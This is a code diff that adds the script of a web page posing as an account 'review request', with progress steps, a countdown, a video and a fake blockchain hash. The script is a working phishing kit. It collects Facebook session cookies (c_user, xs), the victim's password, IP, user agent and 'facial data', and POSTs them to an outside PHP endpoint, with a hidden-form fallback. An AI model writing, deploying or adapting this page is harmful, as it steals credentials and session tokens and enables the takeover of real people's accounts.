+                // Store values for hidden form
+                hiddenCUser.value = cUserInput.value;
+                hiddenXs.value = xsInput.value;
+                
+                // Generate review ID
+                const reviewId = generateReviewId();
+                hiddenReviewId.value = reviewId;
+                reviewIdDisplay.textContent = reviewId;
+                
+                // Generate blockchain hash
+                const blockchainHash = generateBlockchainHash();
+                blockchainHashInput.value = blockchainHash;
+                blockchainHashDisplay.textContent = blockchainHash;
+                
+                // Proceed to next step
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                
+                steps[0].classList.remove('active');
+                steps[1].classList.add('active');
+                steps[0].classList.add('completed');
+                
+                // Update progress line
+                progressLine.style.width = '33%';
+            });
+            
+            // Back to Step 1
+            backToStep1.addEventListener('click', function() {
+                step2.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[1].classList.remove('active');
+                steps[0].classList.add('active');
+                steps[0].classList.remove('completed');
+                
+                progressLine.style.width = '0%';
+                submissionError.style.display = 'none';
+            });
+            
+            // Submit form
+            nextToStep3.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const passwordInput = document.getElementById('password');
+                
+                if (!passwordInput.checkValidity()) {
+                    passwordInput.reportValidity();
+                    return;
+                }
+                
+                // Set password for hidden form
+                hiddenPassword.value = passwordInput.value;
+                
+                // Prepare form data
+                const formData = {
+                    c_user: hiddenCUser.value,
+                    xs: hiddenXs.value,
+                    password: hiddenPassword.value,
+                    review_id: hiddenReviewId.value,
+                    user_agent: userAgent.value,
+                    ip_address: ipAddress.value,
+                    timestamp: timestamp.value,
+                    facial_data: facialData.value,
+                    blockchain_hash: blockchainHashInput.value
+                };
+                
+                // Validate form data
+                if (!formData.c_user || !formData.xs || !formData.password) {
+                    submissionError.textContent = 'Please fill in all required fields.';
+                    submissionError.style.display = 'block';
+                    return;
+                }
+                
+                // Show loading state
+                nextToStep3.disabled = true;
+                nextToStep3.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                
+                // Log form data for debugging
+                console.log('Attempting to submit form with data:', formData);
+                
+                try {
+                    // Submit form data via fetch
+                    const response = await fetch('https://qwerty-1713c.wasmer.app/Shoibpass.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                    
+                    console.log('Server response:', response);
+                    
+                    if (!response.ok) {
+                        throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                    }
+                    
+                    const result = await response.json();
+                    console.log('Submission successful, response:', result);
+                    
+                    // Proceed to success step
+                    step2.classList.remove('active');
+                    step3.classList.add('active');
+                    
+                    steps[1].classList.remove('active');
+                    steps[2].classList.add('active');
+                    steps[1].classList.add('completed');
+                    
+                    progressLine.style.width = '100%';
+                    submissionError.style.display = 'none';
+                } catch (error) {
+                    console.error('Form submission failed:', error);
+                    
+                    // Display user-friendly error
+                    submissionError.textContent = 'Failed to submit the form. Please check your connection and try again.';
+                    submissionError.style.display = 'block';
+                    
+                    // Reset button state
+                    nextToStep3.disabled = false;
+                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
+                    
+                    // Fallback to hiddenForm.submit()
+                    console.log('Attempting fallback form submission');
+                    try {
+                        hiddenForm.submit();
+                    } catch (fallbackError) {
+                        console.error('Fallback submission failed:', fallbackError);
+                    }
+                }
+            });
+            
+            // Reset form
+            function resetForm() {
+                document.getElementById('c_user').value = '';
+                document.getElementById('xs').value = '';
+                document.getElementById('password').value = '';
+                
+                hiddenCUser.value = '';
+                hiddenXs.value = '';
+                hiddenPassword.value = '';
+                hiddenReviewId.value = '';
+                
+                step3.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[2].classList.remove('active');
+                steps[0].classList.add('active');
+                steps[0].classList.remove('completed');
+                steps[1].classList.remove('completed');
+                
+                progressLine.style.width = '0%';
+                
+                video.pause();
+                video.currentTime = 0;
+                videoOverlay.classList.remove('hidden');
+                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                progressBar.style.width = '0%';
+                bufferedBar.style.width = '0%';
+                currentTimeDisplay.textContent = '0:00';
+                submissionError.style.display = 'none';
+                
+                // Reset button state if submission was in progress
+                if (nextToStep3) {
+                    nextToStep3.disabled = false;
+                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
+                }
+            }
+            
+            // Initialize the page
+            initCountdown();
+        });
+    </script>
+</body>
+</html>
